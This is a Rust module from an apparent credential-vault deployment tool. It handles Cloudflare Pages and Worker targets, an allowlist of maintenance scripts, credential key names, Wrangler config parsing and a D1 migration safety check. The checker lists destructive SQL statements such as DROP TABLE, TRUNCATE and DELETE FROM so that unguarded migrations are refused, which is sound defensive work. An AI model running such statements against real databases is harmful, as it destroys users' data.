//! Data-driven deployment targets.
//!
//! Targets are non-secret routing metadata. They are deliberately separate
//! from vault contents so an agent can select a deployment by stable ID
//! without ever receiving an account credential or choosing an arbitrary
//! Cloudflare project.

use std::fs;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};
use serde_json::Value;

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum DeploymentProvider {
    Pages,
    Worker,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct DeploymentTarget {
    pub id: String,
    pub provider: DeploymentProvider,
    pub vault: String,
    pub account_id: String,
    /// Pages project name or Worker script name.
    pub project: String,
    /// Repository/workspace directory used for the build.
    pub project_dir: String,
    /// Build command is executed without any vault credentials.
    pub build_command: String,
    /// Pages output directory, relative to `project_dir`.
    pub output_dir: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub branch: Option<String>,
    /// Dynamically adopted Workers use the repository's fixed `npm run
    /// deploy` script so package-level predeploy guards remain in force.
    /// `false` preserves compatibility with older manually registered targets.
    #[serde(default)]
    pub worker_package_deploy: bool,
    pub created_at: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct DeploymentResult {
    pub target: String,
    pub provider: DeploymentProvider,
    pub status: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub deployment_id: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub url: Option<String>,
    pub files: usize,
}

/// A repository maintenance script Vaultly may execute against a registered
/// deployment target. The agent supplies only the script NAME; the command
/// body is resolved from the repository's own `package.json` at execution
/// time, so agents can never inject arbitrary commands.
///
/// Convention: repositories expose guarded maintenance entry points
/// (`check:migrations`, `migrate:apply`, …) that implement their own safety
/// checks (destructive-statement refusal, pre-migration backup, post-apply
/// verification). Vaultly's guarantees are identity binding (registered
/// target + account match), workspace confinement, cleared environment with
/// a fixed credential key set, output scrubbing, and audit — the same
/// guarantees as `deploy_target`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct ApprovedTargetScript {
    /// Exact `package.json` script name the agent may request.
    pub name: &'static str,
    /// Mutating scripts (database writes, R2 uploads, …) require a typed
    /// confirmation word; read-only checks do not.
    pub mutating: bool,
    /// Expected confirmation word for mutating scripts (intent signal, not
    /// a secret — e.g. `APPLY`). `None` for read-only scripts.
    pub confirm_word: Option<&'static str>,
    pub description: &'static str,
}

/// Fixed allowlist of target maintenance scripts. Deliberately closed: adding
/// a new entry is a reviewed code change, never an agent decision.
pub const APPROVED_TARGET_SCRIPTS: &[ApprovedTargetScript] = &[
    ApprovedTargetScript {
        name: "check:migrations",
        mutating: false,
        confirm_word: None,
        description: "Verify migration safety rules (read-only, no credentials needed)",
    },
    ApprovedTargetScript {
        name: "backup:d1",
        mutating: true,
        confirm_word: Some("BACKUP"),
        description: "Encrypted production D1 backup to R2 (writes backup objects only)",
    },
    ApprovedTargetScript {
        name: "backup:verify",
        mutating: false,
        confirm_word: None,
        description: "Verify a D1 backup (read-only)",
    },
    ApprovedTargetScript {
        name: "migrate:apply",
        mutating: true,
        confirm_word: Some("APPLY"),
        description: "Guarded production migration apply: safety check, backup, apply, verify",
    },
    ApprovedTargetScript {
        name: "watchdog",
        mutating: false,
        confirm_word: None,
        description: "Data-loss watchdog against latest backup (read-only)",
    },
    ApprovedTargetScript {
        name: "smoke",
        mutating: false,
        confirm_word: None,
        description: "Production smoke checks (read-only)",
    },
];

/// Look up an approved script by exact name.
pub fn approved_target_script(name: &str) -> Option<ApprovedTargetScript> {
    APPROVED_TARGET_SCRIPTS
        .iter()
        .find(|s| s.name == name)
        .copied()
}

/// Credential keys Vaultly injects into target maintenance subprocesses.
/// Cloudflare identity plus the conventional encrypted-backup keys; entries
/// absent from the vault are skipped (never an error — the repository script
/// reports clearly what it needs). The agent cannot choose keys.
pub fn target_exec_allowed_keys() -> Vec<String> {
    [
        "CLOUDFLARE_API_TOKEN",
        "CLOUDFLARE_EMAIL",
        "CLOUDFLARE_API_KEY",
        "CLOUDFLARE_ACCOUNT_ID",
        "D1_BACKUP_R2_BUCKET",
        "D1_BACKUP_PASSPHRASE",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect()
}

/// Agent-safe result of a target maintenance execution. Command output is
/// already secret-scrubbed; only injected key NAMES are reported.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct TargetExecResult {
    pub target: String,
    pub script: String,
    pub status: String,
    pub code: i32,
    pub injected_keys: Vec<String>,
    pub scrubbed: bool,
}

/// Safety verdict for one pending migration file, mirroring the repository
/// convention (`check-pending-migrations.mjs`): destructive statements are
/// refused unless guarded by a `_migration_guard_abort` trigger.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct MigrationVerdict {
    pub file: String,
    pub safe: bool,
    pub reason: String,
}

/// Read-only preflight state for one D1 database bound to a target.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct D1Preflight {
    pub database_name: String,
    pub database_id: String,
    pub applied: usize,
    pub pending: Vec<String>,
    pub verdicts: Vec<MigrationVerdict>,
    /// Non-empty when this database could not be inspected; other databases
    /// are still reported.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
}

/// Agent-safe read-only preflight for a deployment target: everything an
/// agent needs to decide whether a deploy (or migrate) is safe, with no
/// credential values and no mutations.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct TargetPreflight {
    pub target: String,
    pub account_id: String,
    pub worker_found: bool,
    pub worker_secret_names: Vec<String>,
    pub databases: Vec<D1Preflight>,
}

/// Migration files are `<number>_<name>.sql`, ordered by name.
pub fn is_migration_file(name: &str) -> bool {
    let mut chars = name.chars();
    let has_number_prefix = matches!(chars.next(), Some(c) if c.is_ascii_digit())
        && name
            .split_once('_')
            .is_some_and(|(n, _)| n.chars().all(|c| c.is_ascii_digit()));
    has_number_prefix && name.ends_with(".sql")
}

/// Local files minus remotely applied names, in sorted order.
pub fn pending_migrations(local_files: &[String], applied_remote: &[String]) -> Vec<String> {
    let applied: std::collections::HashSet<&str> =
        applied_remote.iter().map(|s| s.as_str()).collect();
    let mut pending: Vec<String> = local_files
        .iter()
        .filter(|f| !applied.contains(f.as_str()))
        .cloned()
        .collect();
    pending.sort();
    pending
}

/// Classify one migration's SQL text. Mirrors the repository convention:
/// `DROP TABLE|INDEX|COLUMN`, `TRUNCATE`, and `DELETE FROM` are destructive
/// unless the file carries a `_migration_guard_abort` trigger that aborts
/// when guarded tables contain rows.
pub fn migration_safety_verdict(file: &str, sql: &str) -> MigrationVerdict {
    // Normalize: lowercase, non-word chars become single spaces (approximates
    // the `\b` word boundaries of the repository's destructive regex).
    let mut normalized = String::with_capacity(sql.len());
    let mut last_space = true;
    for c in sql.chars() {
        if c.is_ascii_alphanumeric() || c == '_' {
            normalized.push(c.to_ascii_lowercase());
            last_space = false;
        } else if !last_space {
            normalized.push(' ');
            last_space = true;
        }
    }
    let spaced = format!(" {normalized} ");
    let destructive_hit = [
        " drop table ",
        " drop index ",
        " drop column ",
        " truncate ",
        " delete from ",
    ]
    .iter()
    .any(|pat| spaced.contains(pat));
    // The single approved data-preserving index replacement (see repository
    // migration gate): re-creating one known unique index is not destructive.
    let approved_index_replacement = file == "0047_coin_debt_and_two_extra_attempts.sql"
        && spaced.contains(" drop index if exists uq_gamification_purchase_activity ");
    if !destructive_hit || approved_index_replacement {
        return MigrationVerdict {
            file: file.to_string(),
            safe: true,
            reason: "no destructive statements".into(),
        };
    }
    let guarded = spaced.contains(" create trigger if not exists _migration_guard_abort ")
        && spaced.contains(" raise ")
        && spaced.contains(" abort ");
    MigrationVerdict {
        file: file.to_string(),
        safe: guarded,
        reason: if guarded {
            "destructive but guarded by _migration_guard_abort".into()
        } else {
            "destructive WITHOUT _migration_guard_abort guard — refuse".into()
        },
    }
}

impl DeploymentTarget {
    pub fn validate(&self) -> Result<(), String> {
        for (label, value) in [
            ("id", self.id.as_str()),
            ("vault", self.vault.as_str()),
            ("account_id", self.account_id.as_str()),
            ("project", self.project.as_str()),
            ("project_dir", self.project_dir.as_str()),
            ("build_command", self.build_command.as_str()),
            ("output_dir", self.output_dir.as_str()),
        ] {
            if value.trim().is_empty() || value.chars().any(|c| c.is_control()) {
                return Err(format!(
                    "deployment target {label} is empty or contains control characters"
                ));
            }
        }
        if self.id.contains('/') || self.id.contains('\\') || self.id == "." || self.id == ".." {
            return Err("deployment target id must be a simple name".into());
        }
        if self.account_id.len() != 32 || !self.account_id.chars().all(|c| c.is_ascii_hexdigit()) {
            return Err(
                "deployment target account_id must be a 32-character hexadecimal ID".into(),
            );
        }
        if std::path::Path::new(&self.output_dir).is_absolute()
            || self.output_dir.split('/').any(|part| part == "..")
        {
            return Err("deployment target output_dir must stay inside project_dir".into());
        }
        if self.worker_package_deploy && self.provider != DeploymentProvider::Worker {
            return Err("worker_package_deploy is valid only for Worker targets".into());
        }
        Ok(())
    }
}

/// Local deployment metadata inferred from a Wrangler config. This type has
/// no account or vault fields; those are bound by the engine after policy and
/// credential checks, never by an agent-supplied discovery argument.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DiscoveredDeploymentSpec {
    pub provider: DeploymentProvider,
    pub project: String,
    pub project_dir: PathBuf,
    pub build_command: String,
    pub output_dir: String,
    pub worker_package_deploy: bool,
}

impl DiscoveredDeploymentSpec {
    pub fn target_id(&self, account_id: &str) -> String {
        format!(
            "auto-{}-{}-{}",
            account_id,
            match self.provider {
                DeploymentProvider::Pages => "pages",
                DeploymentProvider::Worker => "worker",
            },
            sanitize_target_id(&self.project)
        )
    }
}

/// Infer local deployment metadata from a Wrangler JSON/JSONC/TOML config.
/// The config is read but never executed, and only the current workspace may
/// be used as the source directory.
pub fn discover_deployment_spec(config_path: &Path) -> Result<DiscoveredDeploymentSpec, String> {
    let config_path = fs::canonicalize(config_path)
        .map_err(|e| format!("invalid Wrangler config '{}': {e}", config_path.display()))?;
    let project_dir = config_path
        .parent()
        .ok_or_else(|| "Wrangler config has no parent directory".to_string())?
        .to_path_buf();
    let workspace = fs::canonicalize(std::env::current_dir().map_err(|e| e.to_string())?)
        .map_err(|e| format!("cannot resolve current workspace: {e}"))?;
    if !project_dir.starts_with(&workspace) {
        return Err(format!(
            "deployment config must be inside the current workspace ({})",
            workspace.display()
        ));
    }

    let raw = fs::read_to_string(&config_path).map_err(|e| {
        format!(
            "cannot read Wrangler config '{}': {e}",
            config_path.display()
        )
    })?;
    let config = parse_wrangler_config(&config_path, &raw)?;
    let project = config
        .get("name")
        .and_then(Value::as_str)
        .filter(|name| !name.trim().is_empty())
        .ok_or_else(|| "Wrangler config must contain a non-empty 'name'".to_string())?
        .to_string();

    let pages_output = config
        .get("pages_build_output_dir")
        .and_then(Value::as_str)
        .filter(|dir| !dir.trim().is_empty());
    let provider = if pages_output.is_some() {
        DeploymentProvider::Pages
    } else if config.get("main").and_then(Value::as_str).is_some() {
        DeploymentProvider::Worker
    } else {
        return Err(
            "Wrangler config must describe a Worker ('main') or Pages ('pages_build_output_dir')"
                .into(),
        );
    };

    let package_path = project_dir.join("package.json");
    let package: Value = serde_json::from_str(
        &fs::read_to_string(&package_path)
            .map_err(|e| format!("cannot read '{}': {e}", package_path.display()))?,
    )
    .map_err(|e| format!("invalid package.json '{}': {e}", package_path.display()))?;
    let scripts = package
        .get("scripts")
        .and_then(Value::as_object)
        .ok_or_else(|| "package.json must contain a scripts object".to_string())?;
    let build_command = if scripts.contains_key("build") {
        "npm run build".to_string()
    } else if project_dir.join("tsconfig.json").is_file() {
        "npm exec tsc -- --noEmit -p tsconfig.json".to_string()
    } else {
        return Err(
            "target needs a package build script or tsconfig.json for a credential-free prebuild"
                .into(),
        );
    };
    let worker_package_deploy = match provider {
        DeploymentProvider::Worker => {
            if !scripts.contains_key("deploy") {
                return Err("Worker adoption requires an npm deploy script so repository predeploy guards cannot be bypassed".into());
            }
            true
        }
        DeploymentProvider::Pages => false,
    };

    Ok(DiscoveredDeploymentSpec {
        provider,
        project,
        project_dir,
        build_command,
        output_dir: pages_output.unwrap_or(".").to_string(),
        worker_package_deploy,
    })
}

fn parse_wrangler_config(path: &Path, raw: &str) -> Result<Value, String> {
    let ext = path
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or_default();
    if ext == "toml" {
        parse_simple_toml(raw, path)
    } else {
        let stripped = strip_json_comments(raw)?;
        serde_json::from_str(&stripped)
            .map_err(|e| format!("invalid Wrangler JSON '{}': {e}", path.display()))
    }
}

/// Parse the top-level string identity fields needed from Wrangler TOML
/// without adding a parser dependency to the credential boundary. Nested
/// bindings are intentionally ignored; deployment identity is top-level.
fn parse_simple_toml(raw: &str, path: &Path) -> Result<Value, String> {
    let mut value = serde_json::Map::new();
    let mut section = String::new();
    for (line_number, raw_line) in raw.lines().enumerate() {
        let uncommented = strip_toml_comment(raw_line);
        let line = uncommented.trim();
        if line.is_empty() {
            continue;
        }
        if line.starts_with('[') {
            if !line.ends_with(']') {
                return Err(format!(
                    "invalid Wrangler TOML '{}' line {}: malformed section",
                    path.display(),
                    line_number + 1
                ));
            }
            section = line[1..line.len() - 1].trim().to_string();
            continue;
        }
        if !section.is_empty() {
            continue;
        }
        let (key, raw_value) = line.split_once('=').ok_or_else(|| {
            format!(
                "invalid Wrangler TOML '{}' line {}: expected key = value",
                path.display(),
                line_number + 1
            )
        })?;
        let key = key.trim();
        if key != "name" && key != "main" && key != "pages_build_output_dir" {
            continue;
        }
        let parsed = parse_toml_string(raw_value.trim()).ok_or_else(|| {
            format!(
                "invalid Wrangler TOML '{}' line {}: {} must be a string",
                path.display(),
                line_number + 1,
                key
            )
        })?;
        value.insert(key.to_string(), Value::String(parsed));
    }
    Ok(Value::Object(value))
}

fn strip_toml_comment(raw: &str) -> String {
    let mut out = String::with_capacity(raw.len());
    let mut quote = None;
    let mut escaped = false;
    for c in raw.chars() {
        if let Some(delimiter) = quote {
            out.push(c);
            if delimiter == '"' && escaped {
                escaped = false;
            } else if delimiter == '"' && c == '\\' {
                escaped = true;
            } else if c == delimiter {
                quote = None;
            }
        } else if c == '"' || c == '\'' {
            quote = Some(c);
            out.push(c);
        } else if c == '#' {
            break;
        } else {
            out.push(c);
        }
    }
    out
}

fn parse_toml_string(raw: &str) -> Option<String> {
    let quote = raw.chars().next()?;
    if quote != '"' && quote != '\'' {
        return None;
    }
    let end = raw.rfind(quote)?;
    if end == 0 || !raw[end + 1..].trim().is_empty() {
        return None;
    }
    let body = &raw[1..end];
    if quote == '\'' {
        Some(body.to_string())
    } else {
        let mut result = String::new();
        let mut escaped = false;
        for c in body.chars() {
            if escaped {
                result.push(match c {
                    '"' => '"',
                    '\\' => '\\',
                    'n' => '\n',
                    'r' => '\r',
                    't' => '\t',
                    _ => return None,
                });
                escaped = false;
            } else if c == '\\' {
                escaped = true;
            } else {
                result.push(c);
            }
        }
        if escaped {
            None
        } else {
            Some(result)
        }
    }
}

fn strip_json_comments(raw: &str) -> Result<String, String> {
    let chars: Vec<char> = raw.chars().collect();
    let mut out = String::with_capacity(raw.len());
    let mut i = 0;
    let mut in_string = false;
    let mut escaped = false;
    while i < chars.len() {
        let c = chars[i];
        if in_string {
            out.push(c);
            if escaped {
                escaped = false;
            } else if c == '\\' {
                escaped = true;
            } else if c == '"' {
                in_string = false;
            }
            i += 1;
            continue;
        }
        if c == '"' {
            in_string = true;
            out.push(c);
            i += 1;
        } else if c == '/' && chars.get(i + 1) == Some(&'/') {
            i += 2;
            while i < chars.len() && chars[i] != '\n' {
                i += 1;
            }
        } else if c == '/' && chars.get(i + 1) == Some(&'*') {
            i += 2;
            let mut closed = false;
            while i + 1 < chars.len() {
                if chars[i] == '*' && chars[i + 1] == '/' {
                    i += 2;
                    closed = true;
                    break;
                }
                if chars[i] == '\n' {
                    out.push('\n');
                }
                i += 1;
            }
            if !closed {
                return Err("unterminated comment in Wrangler JSON".into());
            }
        } else {
            out.push(c);
            i += 1;
        }
    }
    if in_string || escaped {
        return Err("unterminated string in Wrangler JSON".into());
    }
    Ok(out)
}

/// A D1 database binding read from a Wrangler config. Account identity is
/// bound separately by the engine from the vault — never from agent input.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct D1Binding {
    pub binding: String,
    pub database_name: String,
    pub database_id: String,
    pub migrations_dir: Option<String>,
}

/// Read the `d1_databases` bindings from a Wrangler JSON/JSONC config.
/// TOML configs are parsed for `[[d1_databases]]` sections on a best-effort
/// basis using the same dependency-free line parser as identity discovery.
pub fn wrangler_d1_bindings(config_path: &Path) -> Result<Vec<D1Binding>, String> {
    let raw = fs::read_to_string(config_path).map_err(|e| {
        format!(
            "cannot read Wrangler config '{}': {e}",
            config_path.display()
        )
    })?;
    let ext = config_path
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or_default();
    if ext == "toml" {
        return toml_d1_bindings(&raw);
    }
    let stripped = strip_json_comments(&raw)?;
    let config: Value = serde_json::from_str(&stripped)
        .map_err(|e| format!("invalid Wrangler JSON '{}': {e}", config_path.display()))?;
    let mut out = Vec::new();
    if let Some(arr) = config.get("d1_databases").and_then(Value::as_array) {
        for entry in arr {
            let get = |k: &str| {
                entry
                    .get(k)
                    .and_then(Value::as_str)
                    .unwrap_or("")
                    .to_string()
            };
            let (binding, name, id) = (get("binding"), get("database_name"), get("database_id"));
            if binding.is_empty() || name.is_empty() || id.is_empty() {
                return Err(
                    "d1_databases entries need binding, database_name and database_id".into(),
                );
            }
            out.push(D1Binding {
                binding,
                database_name: name,
                database_id: id,
                migrations_dir: entry
                    .get("migrations_dir")
                    .and_then(Value::as_str)
                    .map(|s| s.to_string()),
            });
        }
    }
    Ok(out)
}

/// Minimal `[[d1_databases]]` section parser for Wrangler TOML.
fn toml_d1_bindings(raw: &str) -> Result<Vec<D1Binding>, String> {
    #[derive(Default)]
    struct Partial {
        binding: Option<String>,
        database_name: Option<String>,
        database_id: Option<String>,
        migrations_dir: Option<String>,
    }
    impl Partial {
        fn set(&mut self, key: &str, value: String) {
            match key {
                "binding" => self.binding = Some(value),
                "database_name" => self.database_name = Some(value),
                "database_id" => self.database_id = Some(value),
                "migrations_dir" => self.migrations_dir = Some(value),
                _ => {}
            }
        }
        fn finish(self) -> Result<D1Binding, String> {
            match (self.binding, self.database_name, self.database_id) {
                (Some(binding), Some(database_name), Some(database_id))
                    if !binding.is_empty()
                        && !database_name.is_empty()
                        && !database_id.is_empty() =>
                {
                    Ok(D1Binding {
                        binding,
                        database_name,
                        database_id,
                        migrations_dir: self.migrations_dir,
                    })
                }
                _ => Err("d1_databases entries need binding, database_name and database_id".into()),
            }
        }
    }

    let mut out = Vec::new();
    let mut current: Option<Partial> = None;
    let mut in_d1 = false;
    for raw_line in raw.lines() {
        let line = strip_toml_comment(raw_line).trim().to_string();
        if line.is_empty() {
            continue;
        }
        if line.starts_with('[') {
            if let Some(slot) = current.take() {
                out.push(slot.finish()?);
            }
            in_d1 = line == "[[d1_databases]]";
            continue;
        }
        if !in_d1 {
            continue;
        }
        let Some((key, raw_value)) = line.split_once('=') else {
            continue;
        };
        let value = parse_toml_string(raw_value.trim()).unwrap_or_default();
        current
            .get_or_insert_with(Partial::default)
            .set(key.trim(), value);
    }
    if let Some(slot) = current.take() {
        out.push(slot.finish()?);
    }
    Ok(out)
}

/// An R2 bucket binding read from a Wrangler config. Account identity is
/// bound separately by the engine from the vault — never from agent input.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct R2Binding {
    pub binding: String,
    pub bucket_name: String,
    pub preview_bucket_name: Option<String>,
    /// `remote: true` references a bucket owned elsewhere; Vaultly never
    /// creates those, it only ensures locally-owned buckets exist.
    pub remote: bool,
}

/// Read the `r2_buckets` bindings from a Wrangler JSON/JSONC config.
/// TOML configs are parsed for `[[r2_buckets]]` sections on a best-effort
/// basis using the same dependency-free line parser as identity discovery.
pub fn wrangler_r2_bindings(config_path: &Path) -> Result<Vec<R2Binding>, String> {
    let raw = fs::read_to_string(config_path).map_err(|e| {
        format!(
            "cannot read Wrangler config '{}': {e}",
            config_path.display()
        )
    })?;
    let ext = config_path
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or_default();
    if ext == "toml" {
        return toml_r2_bindings(&raw);
    }
    let stripped = strip_json_comments(&raw)?;
    let config: Value = serde_json::from_str(&stripped)
        .map_err(|e| format!("invalid Wrangler JSON '{}': {e}", config_path.display()))?;
    let mut out = Vec::new();
    if let Some(arr) = config.get("r2_buckets").and_then(Value::as_array) {
        for entry in arr {
            let get = |k: &str| {
                entry
                    .get(k)
                    .and_then(Value::as_str)
                    .unwrap_or("")
                    .to_string()
            };
            let (binding, bucket) = (get("binding"), get("bucket_name"));
            if binding.is_empty() || bucket.is_empty() {
                return Err("r2_buckets entries need binding and bucket_name".into());
            }
            let preview = entry
                .get("preview_bucket_name")
                .and_then(Value::as_str)
                .map(|s| s.to_string());
            let remote = entry
                .get("remote")
                .and_then(Value::as_bool)
                .unwrap_or(false);
            out.push(R2Binding {
                binding,
                bucket_name: bucket,
                preview_bucket_name: preview,
                remote,
            });
        }
    }
    Ok(out)
}

/// Minimal `[[r2_buckets]]` section parser for Wrangler TOML.
fn toml_r2_bindings(raw: &str) -> Result<Vec<R2Binding>, String> {
    #[derive(Default)]
    struct Partial {
        binding: Option<String>,
        bucket_name: Option<String>,
        preview_bucket_name: Option<String>,
        remote: bool,
    }
    impl Partial {
        fn set(&mut self, key: &str, raw_value: &str) {
            match key {
                "binding" => self.binding = parse_toml_string(raw_value),
                "bucket_name" => self.bucket_name = parse_toml_string(raw_value),
                "preview_bucket_name" => self.preview_bucket_name = parse_toml_string(raw_value),
                "remote" => self.remote = raw_value.trim() == "true",
                _ => {}
            }
        }
        fn finish(self) -> Result<R2Binding, String> {
            match (self.binding, self.bucket_name) {
                (Some(binding), Some(bucket_name))
                    if !binding.is_empty() && !bucket_name.is_empty() =>
                {
                    Ok(R2Binding {
                        binding,
                        bucket_name,
                        preview_bucket_name: self.preview_bucket_name,
                        remote: self.remote,
                    })
                }
                _ => Err("r2_buckets entries need binding and bucket_name".into()),
            }
        }
    }

    let mut out = Vec::new();
    let mut current: Option<Partial> = None;
    let mut in_r2 = false;
    for raw_line in raw.lines() {
        let line = strip_toml_comment(raw_line).trim().to_string();
        if line.is_empty() {
            continue;
        }
        if line.starts_with('[') {
            if let Some(slot) = current.take() {
                out.push(slot.finish()?);
            }
            in_r2 = line == "[[r2_buckets]]";
            continue;
        }
        if !in_r2 {
            continue;
        }
        let Some((key, raw_value)) = line.split_once('=') else {
            continue;
        };
        current
            .get_or_insert_with(Partial::default)
            .set(key.trim(), raw_value.trim());
    }
    if let Some(slot) = current.take() {
        out.push(slot.finish()?);
    }
    Ok(out)
}

fn is_plain_token(s: &str) -> bool {
    !s.is_empty()
        && s.bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
}

/// Rewrite the `database_id` paired with `database_name` inside a Wrangler
/// config document (JSON/JSONC or TOML), preserving every other byte.
/// Used after Vaultly provisions a missing D1 so the repository keeps
/// pointing at the account's database. Only plain ASCII name/id tokens are
/// accepted; anything exotic fails safe with a manual-edit message.
pub fn patch_d1_database_id(
    raw: &str,
    database_name: &str,
    new_id: &str,
) -> Result<String, String> {
    if !is_plain_token(database_name) || !is_plain_token(new_id) {
        return Err(
            "refusing to patch database_id for unexpected characters; update it manually".into(),
        );
    }
    if raw.contains("[[d1_databases]]") {
        patch_toml_d1_id(raw, database_name, new_id)
    } else if raw.contains("d1_databases") {
        patch_json_d1_id(raw, database_name, new_id)
    } else {
        Err("no d1_databases section found; add the provisioned database_id manually".into())
    }
}

/// Skip JSON whitespace starting at `i`, returning the new index.
fn skip_json_ws(bytes: &[u8], mut i: usize) -> usize {
    while i < bytes.len()
        && (bytes[i] == b' ' || bytes[i] == b'\t' || bytes[i] == b'\n' || bytes[i] == b'\r')
    {
        i += 1;
    }
    i
}

/// Parse a JSON `"string"` starting at `i` (which must point at the opening
/// quote). Returns the unescaped value and the index just past the closing
/// quote. Only the escapes Wrangler configs plausibly contain are handled;
/// anything else fails safe.
fn parse_json_string_at(raw: &str, i: usize) -> Result<(String, usize), String> {
    let bytes = raw.as_bytes();
    if bytes.get(i) != Some(&b'"') {
        return Err("expected string".into());
    }
    let mut value = String::new();
    let mut j = i + 1;
    while j < bytes.len() {
        match bytes[j] {
            b'"' => return Ok((value, j + 1)),
            b'\\' => {
                j += 1;
                match bytes.get(j) {
                    Some(b'"') => value.push('"'),
                    Some(b'\\') => value.push('\\'),
                    Some(b'n') => value.push('\n'),
                    Some(b't') => value.push('\t'),
                    Some(b'r') => value.push('\r'),
                    _ => return Err("unsupported string escape".into()),
                }
                j += 1;
            }
            _ => {
                let c = raw[j..].chars().next().ok_or("bad string")?;
                value.push(c);
                j += c.len_utf8();
            }
        }
    }
    Err("unterminated string".into())
}

fn patch_json_d1_id(raw: &str, database_name: &str, new_id: &str) -> Result<String, String> {
    let key = "\"database_name\"";
    let mut from = 0;
    while let Some(rel) = raw[from..].find(key) {
        let mut i = skip_json_ws(raw.as_bytes(), from + rel + key.len());
        if raw.as_bytes().get(i) != Some(&b':') {
            from += rel + key.len();
            continue;
        }
        i = skip_json_ws(raw.as_bytes(), i + 1);
        let Ok((name, after_name)) = parse_json_string_at(raw, i) else {
            from += rel + key.len();
            continue;
        };
        if name != database_name {
            from = after_name;
            continue;
        }
        // Found our entry: locate "database_id" within a bounded window.
        let window_end = (after_name + 800).min(raw.len());
        let id_key = "\"database_id\"";
        let Some(id_rel) = raw[after_name..window_end].find(id_key) else {
            return Err(format!(
                "database '{database_name}' has no database_id nearby; update it manually"
            ));
        };
        let mut k = skip_json_ws(raw.as_bytes(), after_name + id_rel + id_key.len());
        if raw.as_bytes().get(k) != Some(&b':') {
            return Err(format!(
                "database '{database_name}' has a malformed database_id; update it manually"
            ));
        }
        k = skip_json_ws(raw.as_bytes(), k + 1);
        let Ok((_, after_id)) = parse_json_string_at(raw, k) else {
            return Err(format!(
                "database '{database_name}' has a malformed database_id; update it manually"
            ));
        };
        // `k` points at the opening quote; `after_id - 1` at the closing one.
        let mut patched = String::with_capacity(raw.len() + new_id.len());
        patched.push_str(&raw[..k + 1]);
        patched.push_str(new_id);
        patched.push_str(&raw[after_id - 1..]);
        return Ok(patched);
    }
    Err(format!(
        "database '{database_name}' not found in d1_databases; add the provisioned database_id manually"
    ))
}

fn patch_toml_d1_id(raw: &str, database_name: &str, new_id: &str) -> Result<String, String> {
    // Work line-wise while preserving original terminators.
    let lines: Vec<&str> = raw.split_inclusive('\n').collect();
    // First pass: find which [[d1_databases]] sections declare our name.
    let mut section_of_line: Vec<usize> = Vec::with_capacity(lines.len());
    let mut section_idx = 0usize;
    let mut in_d1 = false;
    for line in &lines {
        let stripped = strip_toml_comment(line).trim().to_string();
        if stripped.starts_with('[') {
            section_idx += 1;
            in_d1 = stripped == "[[d1_databases]]";
        }
        section_of_line.push(if in_d1 { section_idx } else { 0 });
    }
    let mut matched_sections = std::collections::HashSet::new();
    for (line, section) in lines.iter().zip(section_of_line.iter()) {
        if *section == 0 {
            continue;
        }
        let stripped = strip_toml_comment(line).trim().to_string();
        let Some((key, value)) = stripped.split_once('=') else {
            continue;
        };
        if key.trim() == "database_name"
            && parse_toml_string(value.trim()).as_deref() == Some(database_name)
        {
            matched_sections.insert(*section);
        }
    }
    if matched_sections.is_empty() {
        return Err(format!(
            "database '{database_name}' not found in [[d1_databases]]; add the provisioned database_id manually"
        ));
    }
    // Second pass: rewrite database_id values inside matched sections.
    let mut out = String::with_capacity(raw.len() + 64);
    let mut patched_any = false;
    for (line, section) in lines.iter().zip(section_of_line.iter()) {
        if !matched_sections.contains(section) {
            out.push_str(line);
            continue;
        }
        let stripped = strip_toml_comment(line).trim().to_string();
        let is_id_line = stripped
            .split_once('=')
            .map(|(key, _)| key.trim() == "database_id")
            .unwrap_or(false);
        if !is_id_line {
            out.push_str(line);
            continue;
        }
        // Replace the quoted value on the ORIGINAL line, keeping comments.
        let eq = line.find('=').unwrap_or(0);
        let after_eq = &line[eq + 1..];
        let quote_off = after_eq.find(['"', '\'']);
        let Some(q_rel) = quote_off else {
            return Err(format!(
                "database '{database_name}' has a malformed database_id; update it manually"
            ));
        };
        let quote = after_eq.as_bytes()[q_rel];
        let rest = &after_eq[q_rel + 1..];
        let close_rel = if quote == b'\'' {
            rest.find('\'')
        } else {
            // Double-quoted: honor backslash escapes (ids never contain them,
            // but refuse to guess if they do).
            let mut idx = 0usize;
            let bytes = rest.as_bytes();
            let mut found = None;
            while idx < bytes.len() {
                if bytes[idx] == b'\\' {
                    idx += 2;
                    continue;
                }
                if bytes[idx] == b'"' {
                    found = Some(idx);
                    break;
                }
                idx += 1;
            }
            found
        };
        let Some(c_rel) = close_rel else {
            return Err(format!(
                "database '{database_name}' has a malformed database_id; update it manually"
            ));
        };
        let abs_open = eq + 1 + q_rel;
        let abs_close = abs_open + 1 + c_rel;
        out.push_str(&line[..abs_open + 1]);
        out.push_str(new_id);
        out.push_str(&line[abs_close..]);
        patched_any = true;
    }
    if !patched_any {
        return Err(format!(
            "database '{database_name}' has no database_id nearby; update it manually"
        ));
    }
    Ok(out)
}

/// Normalize the query-response shapes emitted for D1 queries across
/// transports into individual query-response objects:
/// - Wrangler CLI: `[{results:[…], success:…}]` (array of responses)
/// - REST API: `{success:…, result:[{results:[…], success:…}]}` (envelope
///   whose `result` is an array of responses)
